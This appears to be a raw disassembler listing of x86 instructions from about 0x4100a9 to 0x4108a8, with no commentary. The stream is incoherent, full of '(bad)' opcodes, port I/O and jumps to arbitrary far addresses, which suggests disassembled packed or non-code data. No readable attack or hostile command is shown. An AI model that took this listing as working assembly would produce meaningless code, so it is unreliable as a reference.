  4100a9:	das    
  4100aa:	inc    ecx
  4100ab:	jbe    0x410107
  4100ad:	jo     0x410118
  4100af:	mov    edx,?
  4100b1:	jmp    0x1f96997d
  4100b6:	test   eax,0x35ad35eb
  4100bb:	test   DWORD PTR [esi],esi
  4100bd:	xor    al,0x30
  4100bf:	or     al,0x4
  4100c1:	fcomp  QWORD PTR [eax]
  4100c3:	jnp    0x4100f1
  4100c5:	jge    0x410054
  4100c7:	push   esp
  4100c8:	mov    ecx,0xfbbdc52a
  4100cd:	stos   DWORD PTR es:[edi],eax
  4100ce:	je     0x410091
  4100d0:	test   al,0x98
  4100d2:	adc    al,0x2f
  4100d4:	jge    0x41008e
  4100d6:	xchg   esp,eax
  4100d7:	rcl    DWORD PTR [ebp-0x3c],0x62
  4100db:	cmp    DWORD PTR [ecx-0x60de6c7c],ebx
  4100e1:	aaa    
  4100e2:	xchg   ebp,eax
  4100e3:	addr16 retf 0x3aa5
  4100e7:	mov    edi,0xd1e269d2
  4100ec:	int    0x2e
  4100ee:	scas   al,BYTE PTR es:[edi]
  4100ef:	sub    eax,0xcbf6d04e
  4100f4:	je     0x4100bd
  4100f6:	mov    ch,0xbe
  4100f8:	nop
  4100f9:	retf   
  4100fa:	xor    DWORD PTR [edi-0x4467a970],ecx
  410100:	arpl   WORD PTR [ecx],dx
  410102:	sub    BYTE PTR [esi-0x132deb66],ch
  410108:	mov    al,0x44
  41010a:	int    0x36
  41010c:	pusha  
  41010d:	in     al,0xa5
  41010f:	in     eax,0xa5
  410111:	mov    bh,0xd6
  410113:	mov    cl,0xee
  410115:	cmc    
  410116:	in     al,0x13
  410118:	xchg   BYTE PTR fs:[edx],bl
  41011b:	loopne 0x4100c7
  41011d:	dec    eax
  41011e:	lea    ebp,[edx-0x363ba532]
  410124:	stc    
  410125:	out    dx,eax
  410126:	or     dl,BYTE PTR [ebx-0x61d80464]
  41012c:	and    al,dl
  41012e:	outs   dx,DWORD PTR ds:[esi]
  41012f:	jp     0x410180
  410131:	clc    
  410132:	int    0xa2
  410134:	adc    ch,BYTE PTR [esi]
  410136:	mov    ecx,cs
  410138:	fidiv  DWORD PTR [edi]
  41013a:	xchg   ecx,eax
  41013b:	inc    edx
  41013c:	and    DWORD PTR [ebx-0x32],eax
  41013f:	pushf  
  410140:	sub    DWORD PTR [ebp-0x72],ebp
  410143:	push   ecx
  410144:	popf   
  410145:	in     al,0xfd
  410147:	les    ecx,FWORD PTR [eax-0x157aee1b]
  41014d:	mov    bh,0x72
  41014f:	stc    
  410150:	lods   eax,DWORD PTR ds:[esi]
  410151:	xchg   ebp,eax
  410152:	out    dx,eax
  410153:	cmp    eax,0x4a9f8b10
  410158:	pop    edi
  410159:	fisub  DWORD PTR [eax+edx*2+0x63]
  41015d:	js     0x41015c
  41015f:	cmp    al,0x24
  410161:	and    al,0x15
  410163:	lahf   
  410164:	jge    0x410129
  410166:	jbe    0x410188
  410168:	popa   
  410169:	push   ecx
  41016a:	loopne 0x4101e9
  41016c:	xor    bl,BYTE PTR [esi+0x2b30b851]
  410172:	xlat   BYTE PTR ds:[ebx]
  410173:	imul   DWORD PTR [ebx-0x3b86282]
  410179:	mov    BYTE PTR [ebp+0x30],al
  41017c:	ficom  DWORD PTR [ebx-0x70a4160c]
  410183:	add    ecx,esp
  410185:	mov    ecx,0x9f12b1cc
  41018a:	mov    bl,0x62
  41018c:	mov    ebx,0xeccb79
  410191:	scas   al,BYTE PTR es:[edi]
  410192:	(bad)  
  410193:	push   ss
  410194:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410195:	mov    al,0xf5
  410197:	jecxz  0x4101a3
  410199:	aad    0x29
  41019b:	enter  0xdddc,0xf6
  41019f:	rcl    DWORD PTR [ebp+0x792944df],cl
  4101a5:	push   0x725732ff
  4101aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101ab:	sbb    ch,ch
  4101ad:	rcl    BYTE PTR [ebx+0x5ac5c3d6],0xeb
  4101b4:	xor    al,0x31
  4101b7:	das    
  4101b8:	dec    ebx
  4101b9:	gs test eax,0x70034550
  4101bf:	dec    ebp
  4101c0:	mov    BYTE PTR [ebx-0x723da22c],dh
  4101c6:	leave  
  4101c7:	lock pushf 
  4101c9:	hlt    
  4101ca:	test   eax,0xc8e7d372
  4101cf:	into   
  4101d0:	repnz mov DWORD PTR [eax],esp
  4101d3:	imul   ebp,esp,0xea91c60f
  4101d9:	jmp    0x4101a3
  4101db:	leave  
  4101dc:	(bad)  
  4101dd:	retf   
  4101de:	vpsrld ymm0,ymm2,xmm6
  4101e2:	or     bh,ch
  4101e4:	adc    BYTE PTR [edi-0x21],0x20
  4101e8:	test   DWORD PTR [edx+0x40],0x3ad11b10
  4101ef:	mul    BYTE PTR ds:0xe82c7d98
  4101f5:	aaa    
  4101f6:	pop    esi
  4101f7:	cmc    
  4101f8:	adc    ebp,DWORD PTR [ecx+0x27]
  4101fb:	xor    al,BYTE PTR [ebx]
  4101fd:	loopne 0x410276
  4101ff:	cmp    eax,0xe13f4974
  410204:	adc    eax,ebp
  410206:	mov    ch,0x24
  410208:	loop   0x410214
  41020a:	aam    0x17
  41020c:	jl     0x41023e
  41020e:	lods   eax,DWORD PTR ds:[esi]
  41020f:	pop    ebp
  410210:	pop    ebp
  410211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410212:	rcl    DWORD PTR [ebx+0x1d],1
  410215:	shl    BYTE PTR [esi-0x11],1
  410218:	push   ebp
  410219:	mov    ds:0x9fca2a26,al
  41021e:	dec    edx
  41021f:	test   ch,cl
  410221:	xor    bl,BYTE PTR [edi]
  410223:	loop   0x4101f7
  410225:	out    0xd2,al
  410227:	mov    eax,0xdf45ab61
  41022c:	xchg   ebp,eax
  41022d:	outs   dx,DWORD PTR ds:[esi]
  41022e:	gs cdq 
  410230:	sub    BYTE PTR [edx-0x76],ah
  410233:	adc    BYTE PTR [edx+0x30],bh
  410236:	push   ss
  410237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410238:	stos   WORD PTR es:[edi],ax
  41023a:	data16 stos BYTE PTR es:[edi],al
  41023c:	shr    al,0x22
  41023f:	jno    0x410202
  410241:	lock imul edx,ecx,0xffffffa2
  410245:	mov    bh,0xc4
  410247:	inc    eax
  410248:	rol    DWORD PTR [esp+eiz*4+0x6d5db9d3],1
  41024f:	and    DWORD PTR [edx],0x25
  410252:	jl     0x41022e
  410254:	fistp  DWORD PTR [ebx-0x6345d3d2]
  41025a:	add    eax,0x31a5f7a2
  41025f:	(bad)  
  410260:	push   ecx
  410261:	sahf   
  410262:	mov    esi,0xf32d5c37
  410267:	cdq    
  410268:	lods   al,BYTE PTR ds:[esi]
  410269:	xchg   ebx,eax
  41026a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41026b:	xlat   BYTE PTR ds:[ebx]
  41026c:	inc    ebx
  41026d:	inc    ebp
  41026e:	test   DWORD PTR [edx],eax
  410270:	sub    al,0x13
  410272:	or     eax,0xb132b2ee
  410277:	cmp    al,0x52
  410279:	fild   DWORD PTR [edi]
  41027b:	idiv   BYTE PTR [esi+0x75]
  41027e:	mov    ebx,0xce65d16f
  410283:	scas   eax,DWORD PTR es:[edi]
  410284:	mov    ah,0xae
  410286:	jns    0x410287
  410288:	and    eax,0x45c0bf4c
  41028d:	jle    0x4102f6
  41028f:	cmp    BYTE PTR [eax],dl
  410291:	dec    ebp
  410292:	rcl    ah,cl
  410294:	adc    BYTE PTR [edi+ebx*2-0x44],ch
  410298:	ja     0x4102c6
  41029a:	mov    edi,DWORD PTR [edi-0x4f38dba8]
  4102a0:	xchg   esi,eax
  4102a1:	mov    bl,0x80
  4102a3:	pop    esp
  4102a4:	stc    
  4102a5:	sti    
  4102a6:	push   ebx
  4102a7:	jecxz  0x4102a1
  4102a9:	xor    al,BYTE PTR [ebx+0x319e3a13]
  4102af:	ins    BYTE PTR es:[edi],dx
  4102b0:	xor    ah,BYTE PTR [edx-0x548a667a]
  4102b6:	sbb    esi,DWORD PTR [ebp-0x74]
  4102b9:	pusha  
  4102ba:	jmp    0xa6d:0x7598005f
  4102c1:	shr    BYTE PTR [ecx],0xf3
  4102c4:	imul   esp,DWORD PTR [esp+esi*4],0xebdd8798
  4102cb:	daa    
  4102cc:	push   ds
  4102cd:	or     eax,0xd911f729
  4102d2:	mov    ds:0x60efce73,al
  4102d7:	sub    al,0xe1
  4102d9:	add    eax,esi
  4102db:	int3   
  4102dc:	inc    esp
  4102dd:	mov    edx,0x4593c6a8
  4102e2:	push   ecx
  4102e3:	adc    BYTE PTR [edx+0x2b],cl
  4102e6:	fcom   QWORD PTR [ebp-0x3a]
  4102e9:	or     DWORD PTR [eax],esp
  4102eb:	fmulp  st(3),st
  4102ed:	dec    eax
  4102ee:	cmp    DWORD PTR [ebx+eax*4+0x11],eax
  4102f2:	sub    al,0x1d
  4102f4:	mov    ebx,DWORD PTR [ebp-0x11]
  4102f7:	popa   
  4102f8:	mov    ss,ebp
  4102fa:	cmp    esi,DWORD PTR [eax]
  4102fc:	sub    dh,BYTE PTR [ecx-0xd]
  4102ff:	rcr    DWORD PTR [ebp-0x78202c59],0x69
  410306:	jecxz  0x41032c
  410308:	je     0x41034b
  41030a:	ret    0x93de
  41030d:	mov    edx,0x47049a74
  410312:	or     eax,0xe65e01ae
  410317:	inc    esi
  410318:	icebp  
  410319:	xor    eax,0xbb4a23ff
  41031e:	sar    BYTE PTR [ecx-0x24],cl
  410321:	test   DWORD PTR [esi+0x1b],edx
  410324:	dec    edx
  410325:	mov    esi,ss
  410327:	daa    
  410328:	jns    0x41039a
  41032a:	jmp    FWORD PTR [ecx]
  41032c:	loope  0x41038b
  41032e:	jmp    0x1ed:0x4d51ea21
  410335:	push   0xffffffab
  410337:	cwde   
  410338:	dec    ebp
  410339:	xchg   edx,eax
  41033a:	jp     0x410331
  41033c:	pop    esi
  41033d:	mov    edi,0xdadc5b40
  410342:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410344:	pop    ds
  410345:	mov    edi,DWORD PTR [ebp+0x73f2576]
  41034b:	scas   al,BYTE PTR es:[edi]
  41034c:	iret   
  41034d:	mov    bl,0x33
  41034f:	sub    esp,DWORD PTR [edx+0x70]
  410352:	int    0x2
  410354:	arpl   WORD PTR [ebp-0x65],si
  410357:	add    eax,0xa36909c2
  41035c:	lds    edi,FWORD PTR [ebx+0x71eb5e91]
  410362:	popa   
  410363:	into   
  410364:	es dec ebp
  410366:	dec    ecx
  410367:	arpl   WORD PTR [ecx+0xd9a4968],cx
  41036d:	mov    ds:0x70cc0654,eax
  410372:	mov    ah,0x56
  410374:	aaa    
  410375:	cwde   
  410376:	out    0xfd,eax
  410378:	es jo  0x410337
  41037b:	dec    edx
  41037c:	stos   BYTE PTR es:[edi],al
  41037d:	sbb    ecx,ecx
  41037f:	pushf  
  410380:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410381:	add    BYTE PTR [ebp+0x10fbe0ec],dl
  410387:	xchg   edi,eax
  410388:	xor    eax,0xe0a2fd2a
  41038d:	mov    edi,0x4221bda1
  410392:	push   esp
  410393:	cdq    
  410394:	sbb    ecx,DWORD PTR [ecx-0x7dfaf7b3]
  41039a:	and    BYTE PTR [eax],al
  41039c:	add    BYTE PTR [ebx+0xd8bfc45],cl
  4103a2:	add    eax,0x30042fd
  4103a7:	or     eax,0x42fd09
  4103ac:	mov    DWORD PTR ds:0x42fd05,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e11c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0xb547:0xb61abab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	idiv   DWORD PTR [edx]
  4103dc:	js     0x410389
  4103de:	std    
  4103df:	daa    
  4103e0:	addr16 inc edi
  4103e2:	jmp    0x8b6:0x723001d5
  4103e9:	sbb    BYTE PTR [ebx+eax*2-0x2c885368],bh
  4103f0:	ror    BYTE PTR [ebx],cl
  4103f2:	or     eax,0x80328abd
  4103f7:	clc    
  4103f8:	xor    ah,BYTE PTR [ebx+edx*1+0x0]
  4103fc:	sub    al,0x6c
  4103fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103ff:	push   edx
  410400:	mov    ss,WORD PTR [eax+0x41]
  410403:	fcomp  st(7)
  410405:	shr    DWORD PTR [eax+0x43],cl
  410408:	iret   
  410409:	add    BYTE PTR fs:[edi],cl
  41040c:	(bad)  
  41040d:	icebp  
  41040e:	sbb    eax,0xcf2c5310
  410413:	std    
  410414:	jp     0x4103d6
  410416:	stos   DWORD PTR es:[edi],eax
  410417:	lahf   
  410418:	and    dl,dl
  41041a:	xlat   BYTE PTR ds:[ebx]
  41041b:	call   0xaa49:0xfce65b7e
  410422:	(bad)  [edx]
  410424:	pop    esi
  410425:	(bad)  
  410426:	lea    edi,[esi-0x1dda0142]
  41042c:	outs   dx,BYTE PTR ds:[esi]
  41042d:	add    dl,0x1
  410430:	xchg   esp,eax
  410431:	clc    
  410432:	mov    ah,0xce
  410434:	call   0x9d9fed52
  410439:	add    dh,BYTE PTR [ebp+0x671e0664]
  41043f:	fnsave [edx]
  410441:	fcomp  QWORD PTR [edx]
  410443:	xchg   esi,eax
  410444:	stos   BYTE PTR es:[edi],al
  410445:	push   ds
  410446:	cdq    
  410447:	push   cs
  410448:	int    0x9d
  41044a:	mov    es,WORD PTR [edi-0x54c27e29]
  410450:	or     esi,ecx
  410452:	xor    al,0xe0
  410454:	or     eax,0xf8da20b8
  410459:	xchg   edi,eax
  41045a:	sub    ah,BYTE PTR [edx+0x9]
  41045d:	arpl   WORD PTR [ecx-0x37],sp
  410460:	ret    
  410461:	loopne 0x410456
  410463:	in     al,dx
  410464:	or     al,0x93
  410466:	adc    DWORD PTR [esi+eax*8-0x26],ebp
  41046a:	inc    edx
  41046b:	pop    edi
  41046c:	out    dx,al
  41046d:	xchg   DWORD PTR [ebp+0x5],edi
  410470:	xor    cl,BYTE PTR [eax]
  410472:	inc    edx
  410473:	pop    ecx
  410474:	cdq    
  410475:	(bad)  [edx+0x56115e8e]
  41047b:	out    0x5f,al
  41047d:	daa    
  41047e:	scas   eax,DWORD PTR es:[edi]
  41047f:	jecxz  0x4104ff
  410481:	push   edx
  410482:	xchg   esi,eax
  410483:	fnsave [ebx-0x1b72eab3]
  410489:	xor    al,0xcf
  41048b:	push   ebx
  41048c:	xchg   edx,eax
  41048d:	add    eax,0x9dc4f69b
  410492:	mov    ebx,0x9c4ad58c
  410497:	gs push esi
  410499:	addr16 mov ds:0x7ab0,eax
  41049d:	sbb    bl,BYTE PTR [edi+0x95fd0be]
  4104a3:	inc    ecx
  4104a4:	add    DWORD PTR [esi+0x7b1b615d],0xc2faae0e
  4104ae:	xor    DWORD PTR [esi-0x59],0xffffffbb
  4104b2:	or     al,0xc0
  4104b4:	cmp    eax,0xf3325091
  4104b9:	retf   0x55fb
  4104bc:	out    dx,eax
  4104bd:	jmp    0xc3099600
  4104c2:	adc    eax,0x9a8eada3
  4104c7:	dec    ebx
  4104c8:	stos   BYTE PTR es:[edi],al
  4104c9:	xor    cl,cl
  4104cb:	mov    bh,0xe8
  4104cd:	push   ds
  4104ce:	and    eax,0x6750c52c
  4104d3:	push   ecx
  4104d4:	dec    eax
  4104d5:	(bad)  
  4104d6:	ins    DWORD PTR es:[edi],dx
  4104d7:	cmp    ah,BYTE PTR [esi+0x48c7aad7]
  4104dd:	sub    DWORD PTR [edx+ecx*8],esp
  4104e0:	outs   dx,BYTE PTR ds:[esi]
  4104e1:	mov    fs,edx
  4104e3:	(bad)  
  4104e4:	and    esi,DWORD PTR [ecx-0x3e186910]
  4104ea:	fisubr DWORD PTR gs:[ebx]
  4104ed:	adc    cl,BYTE PTR [ecx]
  4104ef:	pop    esp
  4104f0:	lds    edi,FWORD PTR [esi]
  4104f2:	xchg   ebx,eax
  4104f3:	jmp    0xac7aa50e
  4104f8:	aas    
  4104f9:	xchg   BYTE PTR [ecx],dh
  4104fb:	cli    
  4104fc:	stos   DWORD PTR es:[edi],eax
  4104fd:	adc    eax,0xa539acaa
  410502:	sbb    eax,0xf5b68a45
  410507:	mov    esi,0x5e1ffc65
  41050c:	ss pop eax
  41050e:	push   ds
  41050f:	mov    eax,0x3b11f408
  410514:	loop   0x410578
  410516:	xchg   ecx,eax
  410517:	push   0x1316985b
  41051c:	(bad)  
  41051d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41051e:	fisub  WORD PTR [eax-0x17]
  410521:	sti    
  410522:	jnp    0x410599
  410524:	nop
  410525:	jbe    0x4104da
  410527:	fnstcw WORD PTR [edi-0x399329df]
  41052d:	xchg   ecx,eax
  41052e:	jge    0x410523
  410530:	pop    eax
  410531:	enter  0x11fe,0xe0
  410535:	or     BYTE PTR [ebx],0xf
  410538:	or     edi,0xc09c48e9
  41053e:	hlt    
  41053f:	fnstenv [ecx+0x7a]
  410542:	(bad)  
  410544:	addr16 aas 
  410546:	xchg   ebp,eax
  410547:	push   ss
  410548:	jl     0x4105b8
  41054a:	je     0x410580
  41054c:	jbe    0x410536
  41054e:	push   esi
  41054f:	push   ecx
  410550:	jns    0x410532
  410552:	out    dx,eax
  410553:	inc    edx
  410554:	out    dx,al
  410555:	sar    DWORD PTR [edi],1
  410557:	adc    al,0xbe
  410559:	or     al,0xed
  41055b:	cmp    ah,ah
  41055d:	mov    dh,0x7d
  41055f:	jne    0x4104fe
  410561:	(bad)  
  410562:	lock inc edx
  410564:	and    eax,0xa001ef1d
  410569:	jge    0x410589
  41056b:	jp     0x41057e
  41056d:	das    
  41056e:	pushf  
  41056f:	stos   BYTE PTR es:[edi],al
  410570:	mov    cl,0xb
  410572:	outs   dx,DWORD PTR ds:[esi]
  410573:	imul   edi,eax,0xa7f566ab
  410579:	js     0x410554
  41057b:	or     dh,bl
  41057d:	pop    ss
  41057e:	gs clc 
  410580:	jbe    0x41053e
  410582:	pop    es
  410583:	scas   eax,DWORD PTR es:[edi]
  410584:	bswap  edx
  410586:	repnz gs mov al,ah
  41058a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41058b:	fimul  DWORD PTR [edi-0x79]
  41058e:	inc    ebx
  41058f:	or     esp,DWORD PTR [edx+ebx*8-0x30]
  410593:	ror    BYTE PTR [ebx],0xa0
  410596:	es or  eax,0x211cd820
  41059c:	add    ebx,DWORD PTR [edx+0x54]
  41059f:	pop    ss
  4105a0:	js     0x41058e
  4105a2:	jl     0x410524
  4105a4:	aas    
  4105a5:	xor    eax,0x8431bcee
  4105aa:	jp     0x410572
  4105ac:	mov    bl,0x41
  4105ae:	pop    edx
  4105af:	sar    BYTE PTR [esi+ecx*8],1
  4105b2:	push   ss
  4105b3:	test   BYTE PTR [ebp-0x59],ah
  4105b6:	jbe    0x41054d
  4105b8:	scas   eax,DWORD PTR es:[edi]
  4105b9:	inc    esp
  4105ba:	loopne 0x4105ab
  4105bc:	fdivr  DWORD PTR [ecx+0x665356db]
  4105c2:	fs xchg esi,eax
  4105c4:	arpl   WORD PTR [esi+0x29e43e76],cx
  4105ca:	xchg   ebx,eax
  4105cb:	hlt    
  4105cc:	jecxz  0x410596
  4105ce:	inc    esp
  4105cf:	or     ecx,DWORD PTR [eax]
  4105d1:	out    dx,eax
  4105d2:	pop    edx
  4105d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105d4:	lea    ebx,[ebx]
  4105d6:	mov    ah,0x40
  4105d8:	mov    bl,0xde
  4105da:	dec    edx
  4105db:	sbb    esi,ecx
  4105dd:	sbb    BYTE PTR [edi],0x7
  4105e0:	mov    eax,ds:0xacb30950
  4105e5:	mov    edi,DWORD PTR [ebx+0x8b9c451]
  4105eb:	mov    esp,DWORD PTR ds:0x281f7cd
  4105f1:	and    BYTE PTR [eax-0x395627bf],0xeb
  4105f8:	mov    esp,DWORD PTR [edx+0x63]
  4105fb:	dec    ebx
  4105fc:	std    
  4105fd:	fdiv   DWORD PTR [esi+0x63]
  410600:	scas   al,BYTE PTR es:[edi]
  410601:	sti    
  410602:	bound  ecx,QWORD PTR [eax-0x1c]
  410605:	jno    0x410632
  410607:	fidiv  DWORD PTR [ecx+ebx*2]
  41060a:	pop    edx
  41060b:	stos   DWORD PTR es:[edi],eax
  41060c:	adc    bl,al
  41060e:	add    DWORD PTR [ebx],esi
  410610:	mov    ebx,0xa8549bd8
  410615:	jle    0x4105eb
  410617:	mov    dl,0xc1
  410619:	pop    eax
  41061a:	shr    BYTE PTR [esi-0x72f333ea],0x9
  410621:	aaa    
  410622:	jno    0x4105d6
  410624:	into   
  410625:	mov    eax,ds:0x6026be8d
  41062a:	inc    esi
  41062b:	lahf   
  41062c:	mov    ds:0x96a6417d,eax
  410631:	add    eax,0x307c15a1
  410636:	call   0x8d4e329d
  41063b:	sar    DWORD PTR [ebp+0x76cee138],1
  410641:	pop    ebx
  410642:	fdiv   QWORD PTR [esi-0x7b]
  410645:	ss cld 
  410647:	xchg   esi,eax
  410648:	or     eax,0x3072e658
  41064d:	cmp    DWORD PTR [edi],edx
  41064f:	enter  0x4154,0x17
  410653:	jmp    0xe31cefd
  410658:	addr16 mov eax,0x86bd5d0
  41065e:	jnp    0x41067c
  410660:	dec    esi
  410661:	sub    eax,0xba1d602d
  410666:	add    BYTE PTR [edx-0x44],cl
  410669:	ror    BYTE PTR [edi-0x64],cl
  41066c:	stos   BYTE PTR es:[edi],al
  41066d:	call   0x93de:0x2953baf2
  410674:	dec    bh
  410676:	dec    BYTE PTR [eax-0x57]
  410679:	push   0xffffffac
  41067b:	inc    ecx
  41067c:	and    BYTE PTR [eax-0x76285d0b],ah
  410682:	cwde   
  410683:	mov    eax,ds:0x2bf332
  410688:	jno    0x410651
  41068a:	pop    ss
  41068b:	or     bh,0xe0
  41068e:	repz hlt 
  410690:	pop    esp
  410691:	xchg   edi,eax
  410692:	and    ecx,ebx
  410694:	mov    edi,0x5d05a056
  410699:	add    BYTE PTR [edi-0x4e],cl
  41069c:	cmp    esi,DWORD PTR [eax-0xafa2df3]
  4106a2:	mov    bl,bh
  4106a4:	pusha  
  4106a5:	xchg   edi,ebx
  4106a7:	or     ah,BYTE PTR [ecx+0x20]
  4106aa:	into   
  4106ab:	inc    ecx
  4106ac:	fld    st(4)
  4106ae:	mov    eax,ds
  4106b0:	aad    0xdc
  4106b2:	fadd   st,st(6)
  4106b4:	and    eax,0x1021aa6d
  4106b9:	mov    ecx,0xd01d6abf
  4106be:	pop    eax
  4106bf:	cwde   
  4106c0:	mov    cl,0x45
  4106c2:	jo     0x410711
  4106c4:	std    
  4106c5:	jle    0x410716
  4106c7:	push   cs
  4106c8:	or     al,0x0
  4106ca:	xor    al,0x65
  4106cc:	mov    eax,0x68f11fa1
  4106d1:	ja     0x410653
  4106d3:	pop    ss
  4106d4:	aaa    
  4106d5:	fbld   TBYTE PTR [eax]
  4106d7:	push   eax
  4106d8:	xchg   esp,eax
  4106d9:	push   ds
  4106da:	popa   
  4106db:	fs pop eax
  4106dd:	add    DWORD PTR [edi+0x6c],edx
  4106e0:	repnz call 0xa8df:0x4e66ecc4
  4106e8:	sbb    DWORD PTR [edi],ebx
  4106ea:	jecxz  0x410741
  4106ec:	cmp    eax,0xaa61d82b
  4106f1:	jns    0x41067b
  4106f3:	adc    eax,0xfe637789
  4106f8:	aas    
  4106f9:	stos   DWORD PTR es:[edi],eax
  4106fa:	test   al,0x29
  4106fc:	call   0x7f46:0xfe80fbe2
  410703:	add    BYTE PTR ds:0x161cb92f,0x89
  41070a:	xor    bh,bh
  41070c:	test   eax,0x4c3dd0a6
  410711:	sub    esp,edi
  410713:	int3   
  410714:	std    
  410715:	in     eax,dx
  410716:	xlat   BYTE PTR ds:[ebx]
  410717:	push   edx
  410718:	test   eax,0xb12ad424
  41071d:	fwait
  41071e:	jmp    0x32e3b690
  410723:	and    al,ah
  410725:	call   0xb8363017
  41072a:	loopne 0x41075f
  41072c:	pop    eax
  41072d:	or     DWORD PTR [esi],eax
  41072f:	nop
  410730:	repnz mov cl,0x4b
  410733:	cpuid  
  410735:	jge    0x4106fc
  410737:	mov    al,ds:0x32c06e0
  41073c:	xlat   BYTE PTR ds:[ebx]
  41073d:	stos   DWORD PTR es:[edi],eax
  41073e:	mov    DWORD PTR [esi+ecx*4],edx
  410741:	aad    0xcb
  410743:	out    dx,eax
  410744:	sub    DWORD PTR [ebx],0x5e
  410747:	or     BYTE PTR [esi+ecx*4],dh
  41074a:	xor    eax,0x83ad03d4
  41074f:	jl     0x4107b7
  410751:	out    0x21,eax
  410753:	xchg   ebx,eax
  410754:	lahf   
  410755:	lds    esp,FWORD PTR [ecx+0x3e]
  410758:	popa   
  410759:	pop    esp
  41075a:	mov    ah,0xb1
  41075c:	cmp    eax,0xbbeead74
  410761:	out    0x7f,eax
  410763:	cmp    esp,ebx
  410765:	aad    0x5f
  410767:	aam    0xfa
  410769:	jge    0x410759
  41076b:	pop    es
  41076c:	push   ds
  41076d:	sbb    cl,BYTE PTR [ecx+ebp*4]
  410770:	push   ebp
  410771:	jb     0x410715
  410773:	ss jo  0x41079f
  410776:	xchg   DWORD PTR ds:0xcf1ddf69,ecx
  41077c:	adc    edx,DWORD PTR fs:[ecx+ecx*1-0x1d6ffb5c]
  410784:	sub    DWORD PTR [ebp+0x8758b04],0x2f26d981
  41078e:	add    BYTE PTR [eax],al
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	dec    ebp
  4107a9:	or     al,0xc0
  4107ab:	sub    al,0x8b
  4107ad:	inc    esi
  4107ae:	jo     0x410820
  4107b0:	mov    ds:0x1270707d,eax
  4107b5:	mov    cl,0x4b
  4107b7:	mov    bl,0x52
  4107b9:	iret   
  4107ba:	mov    bh,0xed
  4107bc:	mov    ds:0xcb00a4d2,al
  4107c1:	jge    0x410814
  4107c3:	jmp    0x4107cf
  4107c5:	je     0x410805
  4107c7:	mov    al,0x79
  4107c9:	xor    dh,BYTE PTR [edx+ecx*1-0x2e]
  4107cd:	mov    al,ds:0x8b1fc7b
  4107d2:	adc    al,0xa6
  4107d4:	inc    ebp
  4107d5:	xchg   ebx,eax
  4107d6:	adc    al,0x6e
  4107d8:	pop    esp
  4107d9:	and    eax,0x50ff9712
  4107de:	outs   dx,BYTE PTR ds:[esi]
  4107df:	lds    esi,FWORD PTR [esi+0x484b151a]
  4107e5:	mov    esi,DWORD PTR [edi+ecx*4+0x79e4f50b]
  4107ec:	out    dx,al
  4107ed:	sbb    ebp,DWORD PTR [eax+edi*4-0x62]
  4107f1:	inc    esp
  4107f2:	test   DWORD PTR [esi+0x4204d783],esp
  4107f8:	jo     0x410868
  4107fa:	loope  0x410842
  4107fc:	cmp    dh,BYTE PTR [esi+0x6d014b68]
  410802:	std    
  410803:	hlt    
  410804:	cmp    DWORD PTR [ebp-0x25372dc],0x68
  41080b:	std    
  41080c:	jo     0x4107a9
  41080e:	sub    al,0x97
  410810:	(bad)  
  410811:	mov    al,ds:0x2cc039f9
  410816:	in     eax,dx
  410817:	in     eax,0xae
  410819:	stos   BYTE PTR es:[edi],al
  41081a:	aas    
  41081b:	fldenv [esi]
  41081d:	data16 add al,0x13
  410820:	jmp    0xa76b:0x5c353d28
  410827:	call   0x5f06:0x98f6c939
  41082e:	push   0xfffffffa
  410830:	fwait
  410831:	sbb    al,0xce
  410833:	and    esi,DWORD PTR [ecx-0x6c2c9abe]
  410839:	and    DWORD PTR ds:[edi+edx*2],ecx
  41083d:	fstp   TBYTE PTR [esi-0x5e]
  410840:	(bad)
  410845:	scas   al,BYTE PTR es:[edi]
  410846:	dec    ebp
  410847:	adc    BYTE PTR [ebx+0x78],dh
  41084a:	cmp    edi,eax
  41084c:	shl    BYTE PTR [ebp+0x427ea3a5],0x77
  410853:	mov    bh,0x33
  410855:	adc    eax,0xa1620830
  41085a:	pop    ecx
  41085b:	imul   ebx,DWORD PTR [eax-0x42a31565],0x74399cad
  410865:	mov    ebp,DWORD PTR [edi]
  410867:	mov    eax,ds:0x17802c67
  41086c:	pop    eax
  41086d:	imul   ecx,DWORD PTR [edi],0x7
  410870:	sub    ecx,DWORD PTR [edx+0x3a]
  410873:	fsubr  st,st(4)
  410875:	int    0xc5
  410877:	push   ebp
  410878:	shl    DWORD PTR [edi-0x570c1a9e],0xee
  41087f:	jns    0x410885
  410881:	xchg   esi,eax
  410882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410883:	clc    
  410884:	cmp    dl,BYTE PTR [ebp+0x16]
  410887:	mov    cl,BYTE PTR [ebx]
  410889:	rcr    ebp,cl
  41088b:	xor    eax,0xcd6b611b
  410890:	mov    ch,0xf7
  410892:	sar    BYTE PTR [eax+eax*4],cl
  410895:	mov    bl,0xcd
  410897:	fwait
  410898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410899:	mov    BYTE PTR [edx+0x75e11d5d],dl
  41089f:	mov    eax,0xabdcf661
  4108a4:	dec    ecx
  4108a5:	dec    edx
  4108a6:	mov    DWORD PTR [edx],edi
  4108a8:	call   0xc1474e3
